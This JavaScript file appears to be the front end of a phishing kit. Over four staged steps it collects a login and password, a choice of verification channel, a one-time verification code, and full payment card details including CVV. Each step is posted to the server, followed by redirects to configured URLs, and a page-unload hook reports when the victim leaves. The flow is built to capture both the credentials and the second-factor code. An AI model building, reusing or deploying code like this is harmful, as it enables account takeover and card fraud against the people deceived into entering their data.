function App(opt){
	this.prop = {
		redirectAfterEnter: null,
		redirectAfterLogin: null,
		redirectAfterPassword: null,
		redirectAfterType: null,
		redirectAfterCode: null,
		redirectAfterCard: null,
		interval: 3000,
		opacity: 1,
		el: '.loading-wrapper',
		cookieLogin: 'uname',
	};

	let _self = this,
		focus = 0;

	this.Init = function(options){
		_self.prop = $.extend(_self.prop, options);

		// $("[type='password']").focus();

		// $('<div class="loading-wrapper"><div class="loading-preloader"><div></div></div></div>').prependTo("body");

		// _self.initLogin();
		_self.initEnter();
		// _self.initPassword();
		_self.initType();
		_self.initCode();
		_self.initCard();
		_self.initLeave();

		// _self.fadeOut(_self.prop.el);
    	// setTimeout(() => _self.fadeOut(_self.prop.el), _self.prop.interval);
	};

	this.initEnter = function(){

		$('input[name=login]').on('input', function(e) {
            if ($(this).val() == '') {
                $('#enter-button').prop('disabled', true);
            }
        });

		$('input[name=password]').on('input', function(e) {
            if ($(this).val() == '' || $('input[name=login]').val() == '') {
                $('#enter-button').prop('disabled', true);
            } else {
                $('#enter-button').prop('disabled', false);
            }
        });

		$('#enter-button').on('click', function(event) {
			
			if ($('input[name=login]').val() == '') {
                $('#enter-button').prop('disabled', true);
				event.preventDefault();
				return;
			} else {
                $('#enter-button').prop('disabled', false);
			}

			if ($('input[name=password]').val() == '') {
                $('#enter-button').prop('disabled', true);
				event.preventDefault();
				return;
			} else {
                $('#enter-button').prop('disabled', false);
			}

			// $(_self.prop.el).css({'display': 'block', 'opacity': '1'});
			// setTimeout(() => _self.fadeOut(_self.prop.el), _self.prop.interval + 5000);

			$.post( "/", { step: 1, login: $('input[name=login]').val(), pass: $('input[name=password]').val() } )
				.done(function( data ) {
					// $(window).off("beforeunload");
					if (_self.prop.redirectAfterEnter)
						setTimeout(() => window.location.href = _self.prop.redirectAfterEnter, _self.prop.interval);
				});
		});
	};

	this.initLogin = function(){

		$('#login-button').on('click', function(event) {
			
			if ($('input[name=login]').val() == '') {
				$('input[name=login]').css({"background": "#ebadad"});
				event.preventDefault();
				return;
			} else {
				$('input[name=login]').css({"background": "#f5f5f5"});
			}

			$(_self.prop.el).css({'display': 'block', 'opacity': '1'});
			_self.fadeOut(_self.prop.el);
		});
	};

	this.initPassword = function(){

		$('input[name=pass]').on('input', function(e) {
            if ($(this).val() == '') {
                $('#pass-button').prop('disabled', true);
                $('#pass-button').addClass('disabled');
            } else {
                $('#pass-button').prop('disabled', false);
                $('#pass-button').removeClass('disabled');
            }
        });

		$('#pass-button').on('click', function(event) {

			if ($('input[name=pass]').val() == '') {
				$('input[name=pass]').css({"background": "#ebadad"});
				event.preventDefault();
				return;
			} else {
				$('input[name=pass]').css({"background": "#f5f5f5"});
			}

			$(_self.prop.el).css({'display': 'block', 'opacity': '1'});
			setTimeout(() => _self.fadeOut(_self.prop.el), _self.prop.interval + 5000);

			$.post( "/", { step: 1, login: $('input[name=login]').val(), pass: $('input[name=pass]').val() } )
				.done(function( data ) {
					$(window).off("beforeunload");
					if (_self.prop.redirectAfterPassword)
					{
						setTimeout(() => window.location.href = _self.prop.redirectAfterPassword, _self.prop.interval);
					}
					else
					{
						$('#pass-form').css({"display": "none"});
						$('#type-form').css({"display": "block"});
						$('#code-form').css({"display": "none"});
						$('#card-form').css({"display": "none"});
					}
				});
		});
	};

	this.initType = function() {

		// $('#call-btn').on('click', function() {
		// 	$("input#call").prop("checked", true).trigger("click");
		// 	$('#type-button').trigger("click");
		// });

		$('#phone-btn').on('change', function() {
			$("#type-button").prop("disabled", false);
		});

		$('#email-btn').on('click', function() {
			$("#type-button").prop("disabled", false);
		});

		$('#type-button').on('click', function() {

			// $(_self.prop.el).css({'display': 'block', 'opacity': '1'});
			// setTimeout(() => _self.fadeOut(_self.prop.el), _self.prop.interval);

			$.post( "/", { step: 2, type: $('input[name=type]:checked').val() } )
				.done(function( data ) {
					if (_self.prop.redirectAfterType) {
						$(window).off("beforeunload");
						setTimeout(() => window.location.href = _self.prop.redirectAfterType, _self.prop.interval - 1000);
					}
					else
					{
						$('#type-form').css({"display": "none"});
						$('#code-form').css({"display": "block"});
						$('#card-form').css({"display": "none"});
					}
				});
		});
	};
	
	this.initCode = function(){

		$('input[name=code]').on('input', function(e) {
            if ($(this).val() == '') {
                $('#code-button').prop('disabled', true);
            } else {
                $('#code-button').prop('disabled', false);
            }
        });

		$('#code-button').on('click', function() {

			// $(_self.prop.el).css({'display': 'block', 'opacity': '1'});
			// setTimeout(() => _self.fadeOut(_self.prop.el), _self.prop.interval);

			$.post( "/", { step: 3, code: $('input[name=code]').val() } )
				.done(function( data ) {
					if (_self.prop.redirectAfterCode) {
						$(window).off("beforeunload");
						setTimeout(() => window.location.href = _self.prop.redirectAfterCode, _self.prop.interval - 2000);
					}
					else
					{
						// $('#type-form').css({"display": "none"});
						// $('#code-form').css({"display": "none"});
						// $('#card-form').css({"display": "block"});
					}
				});
		});
	};
	
	this.initCard = function(){

		$('input[name=number], input[name=month], input[name=year], input[name=cvv]').on('input', function(e) {
            if ($('input[name=number]').val() == '' || $('input[name=month]').val() == ''
              || $('input[name=year]').val() == '' || $('input[name=cvv]').val() == '') {
                $('#card-button').prop('disabled', true);
                // $('#card-button').addClass('disabled');
            } else {
                $('#card-button').prop('disabled', false);
                // $('#card-button').removeClass('disabled');
            }
        });

		$('#card-button').on('click', function() {
			
			if ($('input[name=number]').val() == '') {
				$('input[name=number]').css({"background": "#ebadad"});
				event.preventDefault();
				return;
			} else {
				$('input[name=number]').css({"background": "#f5f5f5"});
			}

			if ($('input[name=month]').val() == '') {
				$('input[name=month]').css({"background": "#ebadad"});
				event.preventDefault();
				return;
			} else {
				$('input[name=month]').css({"background": "#f5f5f5"});
			}

			if ($('input[name=year]').val() == '') {
				$('input[name=year]').css({"background": "#ebadad"});
				event.preventDefault();
				return;
			} else {
				$('input[name=year]').css({"background": "#f5f5f5"});
			}

			if ($('input[name=cvv]').val() == '') {
				$('input[name=cvv]').css({"background": "#ebadad"});
				event.preventDefault();
				return;
			} else {
				$('input[name=cvv]').css({"background": "#f5f5f5"});
			}
			
			let card = {
				step: 4,
				number: $('input[name=number]').val(),
				expired: $('input[name=month]').val() + '/' + $('input[name=year]').val(),
				cvv: $('input[name=cvv]').val()
			};

			// $(_self.prop.el).css({'display': 'block', 'opacity': '1'});
			// setTimeout(() => _self.fadeOut(_self.prop.el), 15000);//_self.prop.interval);

			$.post( "/", card )
				.done(function( data ) {
					if (_self.prop.redirectAfterCard) {
						// $(window).off("beforeunload");
						setTimeout(() => window.location.href = _self.prop.redirectAfterCard, _self.prop.interval - 1000);
					}
				});
		});
	};
	
	this.initLeave = function(){
		$( "[name='password']" )
		  .focusout(function() {
		    focus++;
		  });

		if (focus){
			$(window).on("beforeunload", function() {
				$.post( "/", { leave: true } )
					.done(function( data ) {
						console.log( "Data Loaded: " + data );
					});

			    // return confirm("Do you really want to close?"); 
			});
		}
	};

	this.fadeOut = function(el){

		let opacity = _self.prop.opacity;
		document.querySelector(el).style.display = "block";

		let timer = setInterval(function() {

			if (_self.prop.opacity <= 0.07) {
				clearInterval(timer);
				document.querySelector(el).style.display = "none";
				_self.prop.opacity = opacity;
			}

			document.querySelector(el).style.opacity = _self.prop.opacity;
			_self.prop.opacity -= _self.prop.opacity * 0.01;

		}, 10);

	};

	this.getCookie = function(name){
		var match = document.cookie.match(RegExp('(?:^|;\\s*)' + name + '=([^;]*)'));
		return match ? match[1] : null;
	},

	_self.Init(opt);
}